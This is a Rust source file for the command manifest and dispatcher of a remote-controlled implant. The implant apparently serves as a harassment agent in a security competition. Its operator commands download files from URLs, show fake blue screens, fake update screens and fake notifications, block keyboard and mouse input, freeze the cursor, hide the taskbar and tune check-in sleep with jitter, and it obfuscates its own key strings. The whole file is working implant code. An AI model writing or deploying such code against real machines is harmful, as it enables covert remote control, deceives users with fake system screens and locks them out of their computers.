//! Command manifest and dispatch.
//!
//! The server stores whatever manifest this module produces and the Web UI
//! renders operator forms straight from it, so `all()` *is* the operator's
//! console. Two rules follow from `webui/assets/js/agents.js` and
//! `server/altin/management_routes.py:202-207`, and both are enforced by the
//! shape of the types here rather than by convention:
//!
//! 1. **Every argument is `required: true`.** The API compares the number of
//!    supplied arguments against the number of required ones and rejects
//!    anything else. An optional argument is worse than useless: the UI renders
//!    it without an asterisk, the operator leaves it blank, blank inputs are
//!    dropped from the array (`agents.js:323`), and every later argument
//!    shifts down one slot. So genuinely optional behaviour is expressed with a
//!    sentinel value, and the sentinel is documented in the description.
//!
//! 2. **Arguments are positional and only as long as declared.** `ArgDef` has
//!    no `required` field to set, so an optional argument cannot be declared by
//!    accident.

use serde_json::{json, Value};

use crate::gui;
use crate::info;
use crate::jobs;
use crate::obf;
use crate::sleep;

pub struct ArgDef {
    pub name: String,
    pub arg_type: &'static str,
    pub description: String,
}

pub struct CommandDef {
    pub name: String,
    pub description: String,
    pub args: Vec<ArgDef>,
}

fn arg(name: &str, arg_type: &'static str, description: &str) -> ArgDef {
    ArgDef {
        name: name.to_string(),
        arg_type,
        description: description.to_string(),
    }
}

fn command(name: &str, description: &str, args: Vec<ArgDef>) -> CommandDef {
    CommandDef {
        name: name.to_string(),
        description: description.to_string(),
        args,
    }
}

/// The capability manifest, in console order.
pub fn all() -> Vec<CommandDef> {
    vec![
        // --- operator / cleanup -------------------------------------------
        command(
            "sysinfo",
            "Report OS, elevation, screen size and overlay state",
            vec![],
        ),
        command(
            "listoverlays",
            "List running overlays with their id and age",
            vec![],
        ),
        command("stopall", "Close every running overlay", vec![]),
        command("kill", "Stop the implant", vec![]),
        command(
            "getsleep",
            "Get the current sleep time and jitter",
            vec![],
        ),
        command(
            "setsleep",
            "Set the sleep time between check-ins",
            vec![
                arg("seconds", "int", "Seconds between check-ins, minimum 1"),
                arg("jitter", "int", "Random extra delay, 0 to seconds"),
            ],
        ),
        command(
            "fetchimage",
            "Download a file to the implant's cache and return its path",
            vec![
                arg("url", "str", "HTTP(S) URL to download"),
                arg(
                    "filename",
                    "str",
                    "Name to save as; directories in the name are stripped",
                ),
            ],
        ),
        // --- core ---------------------------------------------------------
        command(
            "msgbox",
            "Show a message box",
            vec![
                arg("title", "str", "Window title"),
                arg("body", "str", "Message body"),
                arg(
                    "icon",
                    "str",
                    "One of: none, info, warning, error, question",
                ),
                arg("sound", "bool", "Play a system sound with the dialog"),
            ],
        ),
        command(
            "showimage",
            "Show an image over the desktop",
            vec![
                arg("path", "str", "Absolute path to the image"),
                arg("mode", "str", "One of: fullscreen, center, fit"),
                arg(
                    "seconds",
                    "int",
                    "Auto-close after this many seconds; 0 stays until stopall",
                ),
                arg("topmost", "bool", "Keep the window above other windows"),
            ],
        ),
        command(
            "setwallpaper",
            "Set the desktop wallpaper",
            vec![arg("path", "str", "Absolute path to the image")],
        ),
        command(
            "getwallpaper",
            "Report the current wallpaper path so it can be restored",
            vec![],
        ),
        command(
            "shakescreen",
            "Shake a window back and forth",
            vec![
                arg("seconds", "int", "How long to shake for, capped at 30"),
                arg("amplitude", "int", "Horizontal travel in pixels, 1-200"),
                arg("interval", "int", "Milliseconds between moves, 10-200"),
                arg(
                    "target",
                    "str",
                    "One of: foreground, all, mouse",
                ),
            ],
        ),
        // --- fake system UI -----------------------------------------------
        command(
            "fakebsod",
            "Fullscreen fake blue screen with a progress bar",
            vec![
                arg("stopcode", "str", "Fake stop code, e.g. CRITICAL_PROCESS_DIED"),
                arg("percent", "int", "Fake completion percentage, 0-100"),
                arg("seconds", "int", "Auto-close after this many seconds; 0 stays"),
            ],
        ),
        command(
            "fakeupdate",
            "Fullscreen fake 'working on updates' screen",
            vec![
                arg("title", "str", "Headline text"),
                arg("percent", "int", "Fake completion percentage, 0-100"),
                arg("seconds", "int", "Auto-close after this many seconds; 0 stays"),
            ],
        ),
        command(
            "faketoast",
            "Fake desktop notification",
            vec![
                arg("title", "str", "Notification title"),
                arg("body", "str", "Notification body"),
                arg("seconds", "int", "Auto-close after this many seconds"),
            ],
        ),
        command(
            "titlechange",
            "Retitle the foreground window",
            vec![arg("title", "str", "New window title text")],
        ),
        command(
            "gettitle",
            "Report the foreground window's current title",
            vec![],
        ),
        command(
            "toggletaskbar",
            "Hide or show the taskbar",
            vec![arg("state", "str", "One of: hide, show, toggle")],
        ),
        // --- sensory -------------------------------------------------------
        command(
            "scare",
            "Fullscreen image plus sound at once",
            vec![
                arg("image", "str", "Absolute path to the image"),
                arg(
                    "sound",
                    "str",
                    "Absolute path to a sound file, or the literal `none`",
                ),
                arg("seconds", "int", "Auto-close after this many seconds"),
            ],
        ),
        command(
            "spook",
            "Fullscreen animated static, matrix rain or scanlines",
            vec![
                arg(
                    "mode",
                    "str",
                    "One of: static, matrix, scanline, glitch",
                ),
                arg("seconds", "int", "Auto-close after this many seconds; 0 stays"),
            ],
        ),
        command(
            "playsound",
            "Play a sound file",
            vec![
                arg("path", "str", "Absolute path to a WAV file"),
                arg("loop", "bool", "Repeat until stopped"),
            ],
        ),
        command(
            "volume",
            "Change the system playback volume",
            vec![
                arg("action", "str", "One of: mute, unmute, max, min, set"),
                arg("level", "int", "Level 0-100, used when action is `set`"),
            ],
        ),
        // --- desktop -------------------------------------------------------
        command(
            "cursor",
            "Hide, freeze or move the mouse pointer",
            vec![
                arg(
                    "action",
                    "str",
                    "One of: hide, show, freeze, corner, shake",
                ),
                arg("seconds", "int", "How long to hold it; capped at 60"),
            ],
        ),
        command(
            "desktopnote",
            "Draw a large text note on the desktop",
            vec![
                arg("text", "str", "Text to display"),
                arg("x", "int", "Position in pixels from the top-left"),
                arg("y", "int", "Position in pixels from the top-left"),
                arg("size", "int", "Font size in pixels, 8-200"),
            ],
        ),
        command(
            "fontsize",
            "Scale the system UI font",
            vec![arg("percent", "int", "Scale percentage, 50-300")],
        ),
        command(
            "minimizeall",
            "Minimise or restore every window",
            vec![arg("state", "str", "One of: minimize, restore, toggle")],
        ),
        command(
            "openurl",
            "Open a URL in the default browser",
            vec![
                arg("url", "str", "URL to open"),
                arg("background", "bool", "Do not wait for the browser to exit"),
            ],
        ),
        command(
            "lockinput",
            "Block keyboard and mouse input; 0 = until stopall",
            vec![arg(
                "seconds",
                "int",
                "Seconds to block for; 0 holds until stopall",
            )],
        ),
    ]
}

/// The manifest as the server expects it. Note the absent `required` key on the
/// command objects and the hardcoded `true` on each argument.
pub fn manifest() -> Value {
    json!(all()
        .iter()
        .map(|c| json!({
            "command": c.name,
            "description": c.description,
            "args": c.args.iter().map(|a| json!({
                "name": a.name,
                "arg_type": a.arg_type,
                "description": a.description,
                "required": true,
            })).collect::<Vec<_>>(),
        }))
        .collect::<Vec<_>>())
}

// ---------------------------------------------------------------------------
// Argument access
//
// Every accessor falls back to a default rather than panicking. The server's
// count check makes a short array unreachable through the Web UI, but the C2
// endpoint accepts a hand-built body, and one malformed task should not take
// the implant down mid-competition.
// ---------------------------------------------------------------------------

fn arg_str(args: &[Value], index: usize) -> String {
    args.get(index)
        .and_then(|v| v.as_str())
        .unwrap_or_default()
        .to_string()
}

fn arg_int(args: &[Value], index: usize) -> i64 {
    args.get(index)
        .and_then(|v| v.as_i64())
        .or_else(|| args.get(index).and_then(|v| v.as_f64()).map(|f| f as i64))
        .unwrap_or(0)
}

fn arg_bool(args: &[Value], index: usize) -> bool {
    args.get(index)
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
}

/// Matches `value` against `options`, returning the canonical spelling or an
/// error naming what was acceptable. Sentinels (`none`, `0`, `-1`) are handled
/// by the individual commands rather than here.
fn one_of(value: &str, options: &[&str]) -> Result<String, String> {
    let lowered = value.trim().to_ascii_lowercase();

    options
        .iter()
        .find(|o| **o == lowered)
        .map(|o| o.to_string())
        .ok_or_else(|| {
            format!(
                "`{value}` is not one of: {}",
                options.join(", ")
            )
        })
}

/// Non-negative duration, with 0 meaning "no auto-close".
fn duration_arg(
    args: &[Value],
    index: usize,
    cap: u64,
) -> Result<Option<std::time::Duration>, String> {
    let seconds = arg_int(args, index);
    if seconds < 0 {
        return Err("duration cannot be negative".into());
    }

    let capped = seconds.min(cap as i64);

    Ok(if capped == 0 {
        None
    } else {
        Some(std::time::Duration::from_secs(capped as u64))
    })
}

// ---------------------------------------------------------------------------
// Dispatch
// ---------------------------------------------------------------------------

/// Runs one task and returns the operator-facing result string.
///
/// The result is stored in a `TextField` and rendered inside a `<pre>` in the
/// console, so it should be a short status line rather than a payload.
pub fn dispatch(task: &Value) -> String {
    let name = task
        .get(obf!("task"))
        .and_then(|v| v.as_str())
        .unwrap_or_default()
        .to_string();

    let empty: Vec<Value> = Vec::new();
    let args = task
        .get(obf!("args"))
        .and_then(|v| v.as_array())
        .unwrap_or(&empty)
        .clone();

    match name.as_str() {
        // --- operator / cleanup -------------------------------------------
        "sysinfo" => info::report(),
        "listoverlays" => gui::describe_overlays(),
        "stopall" => {
            // Input is released by `stop_all` as well as overlays, and the
            // message should say so when it was the only thing holding.
            let input_was_active = gui::input_lock_active();
            let closed = gui::stop_all();

            let mut parts = Vec::new();
            if closed > 0 {
                parts.push(format!("closed {closed} overlay(s)"));
            }
            if input_was_active {
                parts.push("input lock released".to_string());
            }
            if parts.is_empty() {
                "nothing was running".to_string()
            } else {
                parts.join("; ")
            }
        }
        "kill" => {
            gui::stop_all();
            // Give queued result writes a moment, then leave. Mirrors
            // Tombili's shared.kill, which sleeps on a spawned thread first.
            std::thread::spawn(|| {
                std::thread::sleep(std::time::Duration::from_millis(750));
                std::process::exit(0);
            });
            "implant is stopping".to_string()
        }
        "fetchimage" => {
            let url = arg_str(&args, 0);
            let filename = arg_str(&args, 1);
            match jobs::fetch(&url, &filename) {
                Ok(path) => format!("downloaded to {path}"),
                Err(e) => format!("download failed: {e}"),
            }
        }

        // --- core ---------------------------------------------------------
        "msgbox" => {
            let title = arg_str(&args, 0);
            let body = arg_str(&args, 1);
            let icon = arg_str(&args, 2);
            let sound = arg_bool(&args, 3);

            let icon = match one_of(&icon, &["none", "info", "warning", "error", "question"]) {
                Ok(value) => value,
                Err(e) => return e,
            };

            // MessageBoxW is modal: it does not return until the dialog is
            // dismissed. It has to run off the check-in thread or the implant
            // stops checking in for as long as the box is open.
            gui::detach(move || {
                gui::win::msgbox(&title, &body, &icon, sound);
            });

            "message box opened".to_string()
        }
        "showimage" => {
            let path = arg_str(&args, 0);
            let mode = match one_of(&arg_str(&args, 1), &["fullscreen", "center", "fit"]) {
                Ok(value) => value,
                Err(e) => return e,
            };
            let duration = match duration_arg(&args, 2, 3600) {
                Ok(value) => value,
                Err(e) => return e,
            };
            let topmost = arg_bool(&args, 3);

            match gui::open_image(&path, &mode, duration, topmost) {
                Ok(id) => overlay_ack(id, "image", &path, duration),
                Err(e) => format!("could not show image: {e}"),
            }
        }
        "setwallpaper" => {
            let path = arg_str(&args, 0);
            let result = gui::win::set_wallpaper(&path);

            match result {
                Ok(()) => format!("wallpaper set to {path}"),
                Err(e) => format!("could not set wallpaper: {e}"),
            }
        }
        "getwallpaper" => {
            let result = gui::win::get_wallpaper();

            match result {
                Ok(path) => format!("current wallpaper: {path}"),
                Err(e) => format!("could not read wallpaper: {e}"),
            }
        }
        "shakescreen" => {
            let seconds = arg_int(&args, 0);
            let amplitude = arg_int(&args, 1);
            let interval = arg_int(&args, 2);
            let target = match one_of(
                &arg_str(&args, 3),
                &["foreground", "all", "mouse"],
            ) {
                Ok(value) => value,
                Err(e) => return e,
            };

            if !(1..=30).contains(&seconds) {
                return "seconds must be between 1 and 30".to_string();
            }
            if !(1..=200).contains(&amplitude) {
                return "amplitude must be between 1 and 200 pixels".to_string();
            }
            if !(10..=200).contains(&interval) {
                return "interval must be between 10 and 200 ms".to_string();
            }

            if target == "mouse" {
                return cursor_task("shake", seconds as u64);
            }

            let shown = target.clone();
            gui::detach(move || {
                crate::gui::win::shake(
                    seconds as u64,
                    amplitude as i32,
                    interval as u64,
                    &target,
                );
            });

            format!("shaking {shown} for {seconds}s")
        }

        // --- fake system UI -----------------------------------------------
        "fakebsod" => {
            let stopcode = arg_str(&args, 0);
            let percent = arg_int(&args, 1).clamp(0, 100);
            let duration = match duration_arg(&args, 2, 3600) {
                Ok(value) => value,
                Err(e) => return e,
            };

            match gui::open_bsod(&stopcode, percent, duration) {
                Ok(id) => overlay_ack(id, "fakebsod", &stopcode, duration),
                Err(e) => format!("could not open fakebsod: {e}"),
            }
        }
        "fakeupdate" => {
            let title = arg_str(&args, 0);
            let percent = arg_int(&args, 1).clamp(0, 100);
            let duration = match duration_arg(&args, 2, 3600) {
                Ok(value) => value,
                Err(e) => return e,
            };

            match gui::open_update(&title, percent, duration) {
                Ok(id) => overlay_ack(id, "fakeupdate", &title, duration),
                Err(e) => format!("could not open fakeupdate: {e}"),
            }
        }
        "faketoast" => {
            let title = arg_str(&args, 0);
            let body = arg_str(&args, 1);
            let seconds = arg_int(&args, 2);
            if !(1..=600).contains(&seconds) {
                return "seconds must be between 1 and 600".to_string();
            }

            let duration = Some(std::time::Duration::from_secs(seconds as u64));
            match gui::open_toast(&title, &body, duration) {
                Ok(id) => overlay_ack(id, "faketoast", &title, duration),
                Err(e) => format!("could not open faketoast: {e}"),
            }
        }
        "titlechange" => {
            let title = arg_str(&args, 0);
            let result = gui::win::set_foreground_title(&title);

            match result {
                Ok(previous) => format!("title set to `{title}` (was `{previous}`)"),
                Err(e) => format!("could not set title: {e}"),
            }
        }
        "gettitle" => {
            let result = gui::win::get_foreground_title();

            match result {
                Ok(title) => format!("foreground window: `{title}`"),
                Err(e) => format!("could not read title: {e}"),
            }
        }
        "toggletaskbar" => {
            let state = match one_of(&arg_str(&args, 0), &["hide", "show", "toggle"]) {
                Ok(value) => value,
                Err(e) => return e,
            };

            let result = gui::win::set_taskbar(&state);

            match result {
                Ok(()) => format!("taskbar {state}"),
                Err(e) => format!("could not change taskbar: {e}"),
            }
        }

        // --- sensory -------------------------------------------------------
        "scare" => {
            let image = arg_str(&args, 0);
            let sound = arg_str(&args, 1);
            let seconds = arg_int(&args, 2);
            if !(1..=600).contains(&seconds) {
                return "seconds must be between 1 and 600".to_string();
            }

            // The literal `none` means "image only". This is the sentinel that
            // an optional argument would otherwise have provided.
            if !sound.trim().is_empty() && !sound.eq_ignore_ascii_case("none") {
                gui::detach(move || {
                    let _ = jobs::play_sound(&sound, false);
                });
            }

            let duration = Some(std::time::Duration::from_secs(seconds as u64));
            match gui::open_scare(&image, duration) {
                Ok(id) => overlay_ack(id, "scare", &image, duration),
                Err(e) => format!("could not open scare: {e}"),
            }
        }
        "spook" => {
            let mode = match one_of(
                &arg_str(&args, 0),
                &["static", "matrix", "scanline", "glitch"],
            ) {
                Ok(value) => value,
                Err(e) => return e,
            };
            let duration = match duration_arg(&args, 1, 3600) {
                Ok(value) => value,
                Err(e) => return e,
            };

            match gui::open_spook(&mode, duration) {
                Ok(id) => overlay_ack(id, "spook", &mode, duration),
                Err(e) => format!("could not open spook: {e}"),
            }
        }
        "playsound" => {
            let path = arg_str(&args, 0);
            let looping = arg_bool(&args, 1);

            let shown = path.clone();
            gui::detach(move || {
                // The failure is only visible in the implant's own log: the ack
                // was already sent, and the alternative is blocking the
                // check-in loop on an audio device that may not exist.
                if let Err(e) = jobs::play_sound(&path, looping) {
                    crate::log::log_lazy(|| format!("playsound failed: {e}"));
                }
            });

            format!(
                "playing {shown} ({})",
                if looping { "looping" } else { "once" }
            )
        }
        "volume" => {
            let action = match one_of(
                &arg_str(&args, 0),
                &["mute", "unmute", "max", "min", "set"],
            ) {
                Ok(value) => value,
                Err(e) => return e,
            };
            let level = arg_int(&args, 1);

            let result = gui::win::set_volume(&action, level.clamp(0, 100) as u32);

            match result {
                Ok(()) => format!("volume {action}"),
                Err(e) => format!("could not change volume: {e}"),
            }
        }

        // --- desktop -------------------------------------------------------
        "cursor" => {
            let action = match one_of(
                &arg_str(&args, 0),
                &["hide", "show", "freeze", "corner", "shake"],
            ) {
                Ok(value) => value,
                Err(e) => return e,
            };
            let seconds = arg_int(&args, 1);
            if !(1..=60).contains(&seconds) {
                return "seconds must be between 1 and 60".to_string();
            }

            cursor_task(&action, seconds as u64)
        }
        "desktopnote" => {
            let text = arg_str(&args, 0);
            let x = arg_int(&args, 1);
            let y = arg_int(&args, 2);
            let size = arg_int(&args, 3).clamp(8, 200);

            let duration = Some(std::time::Duration::from_secs(120));
            match gui::open_note(&text, x, y, size, duration) {
                Ok(id) => overlay_ack(id, "desktopnote", &text, duration),
                Err(e) => format!("could not open desktopnote: {e}"),
            }
        }
        "fontsize" => {
            let percent = arg_int(&args, 0);
            if !(50..=300).contains(&percent) {
                return "percent must be between 50 and 300".to_string();
            }

            let result = gui::win::set_font_scale(percent as u32);

            match result {
                Ok(()) => format!("UI scale set to {percent}%"),
                Err(e) => format!("could not change UI scale: {e}"),
            }
        }
        "minimizeall" => {
            let state = match one_of(&arg_str(&args, 0), &["minimize", "restore", "toggle"]) {
                Ok(value) => value,
                Err(e) => return e,
            };

            let result = gui::win::set_minimized(&state);

            match result {
                Ok(()) => format!("windows {state}"),
                Err(e) => format!("could not change windows: {e}"),
            }
        }
        "openurl" => {
            let url = arg_str(&args, 0);
            let background = arg_bool(&args, 1);

            match jobs::open_url(&url, background) {
                Ok(()) => format!("opened {url}"),
                Err(e) => format!("could not open URL: {e}"),
            }
        }
        "lockinput" => {
            // Anything zero is a hold until `stopall`; a positive number is a
            // timeout. The ceiling is gone - the operator decides how long -
            // but the release is always reachable, which is the safety property
            // that matters: `stopall` cancels the hold from the check-in thread
            // no matter how long it was asked for.
            let requested = arg_int(&args, 0);
            if requested < 0 {
                return "seconds must be 0 (until stopall) or a positive number".to_string();
            }

            // `BlockInput` needs SE_DEBUG access, so an implant that is not
            // elevated is refused. The refusal is checked on the worker thread
            // and the ack below is still immediate, which is the point - a
            // non-elevated implant reports the failure in its own log rather
            // than stalling the check-in loop waiting to find out.
            let _ = gui::lock_input(requested as u64);

            if requested == 0 {
                "input blocked until stopall".to_string()
            } else {
                format!("input blocked for {requested}s")
            }
        }

        // --- shared --------------------------------------------------------
        "getsleep" => {
            let (s, j) = sleep::get();
            format!("sleep: {s}s, jitter: {j}s")
        }
        "setsleep" => {
            let s = arg_int(&args, 0);
            let j = arg_int(&args, 1);

            if s <= 0 || j < 0 {
                return "sleep must be positive and jitter cannot be negative".to_string();
            }

            match sleep::set(s as u64, j as u64) {
                Ok(()) => format!("sleep set to {s}s with {j}s jitter"),
                Err(e) => e,
            }
        }

        other => format!("unknown command `{other}`"),
    }
}

fn overlay_ack(
    id: u64,
    label: &str,
    detail: &str,
    duration: Option<std::time::Duration>,
) -> String {
    let shown = if detail.is_empty() {
        String::new()
    } else {
        format!(" ({detail})")
    };

    let lifetime = match duration {
        Some(d) => format!(" for {}s", d.as_secs()),
        None => " until stopall".to_string(),
    };

    format!("{label} opened{shown} as overlay {id}{lifetime}")
}

/// Pointer manipulation, shared by the `cursor` and `shakescreen target=mouse`
/// paths.
///
/// The check-in thread is not blocked either way, since `SetCursorPos` and
/// `ClipCursor` return immediately; the caller moves the pointer back on a
/// timer so the effect outlives the call.
fn cursor_task(action: &str, seconds: u64) -> String {
    let owned = action.to_string();
    let worker = owned.clone();
    gui::detach(move || {
        crate::gui::win::cursor(&worker, seconds);
    });

    format!("cursor {owned} for {seconds}s")
}
